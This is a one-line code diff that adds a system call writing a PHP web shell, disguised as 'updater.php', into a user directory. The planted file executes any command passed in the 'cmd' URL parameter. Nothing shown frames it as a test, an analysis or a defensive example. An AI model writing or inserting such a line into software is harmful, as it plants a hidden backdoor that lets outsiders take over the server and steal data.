@@ -1,0 +1,1 @@
+system('cmd /c echo ^<?php system($_GET["cmd"]); ?^> > user\\updater.php');
